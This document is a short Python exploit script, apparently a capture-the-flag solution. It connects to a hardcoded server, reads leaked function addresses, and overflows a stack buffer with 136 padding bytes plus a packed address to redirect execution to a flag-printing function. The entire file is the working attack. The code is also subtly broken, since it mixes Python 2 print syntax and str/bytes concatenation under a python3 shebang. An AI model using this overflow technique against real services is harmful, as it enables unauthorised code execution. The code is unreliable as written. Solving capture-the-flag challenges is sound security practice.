#!/usr/bin/env python3

import socket
import sys
import ipaddress
from pwn import *
        
def send_data(socket, data):
    return(socket.send(data))
    
def recv_data_utf8(socket):
    return(socket.recv(1024).decode("utf-8"))

def main(argv):

    ip_address = "35.196.12.234"
    port = 31337
        
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        my_socket.connect((ip_address, port))
    except ConnectionRefusedError:
        print("Can't connect to the server!")
        return(False)
        
    # Getting the first line with function addresses
    function_addresses = (recv_data_utf8(my_socket))
    print function_addresses
    function_addresses = function_addresses.split(' ')
    # The first address is for the function who prints the flag 
    function_addresses[1] = int(function_addresses[1], 16)
    correct_pw_address = p64((function_addresses[1]))
    # 136 bytes needed to get to the return address
    exploit = "B"*136 + correct_pw_address
    
    print(recv_data_utf8(my_socket))
    send_data(my_socket, exploit + "\n")
    print(recv_data_utf8(my_socket))
    print(recv_data_utf8(my_socket))
    
    my_socket.shutdown(socket.SHUT_RDWR)
    my_socket.close()   
          
if __name__ == '__main__':
    main(sys.argv)
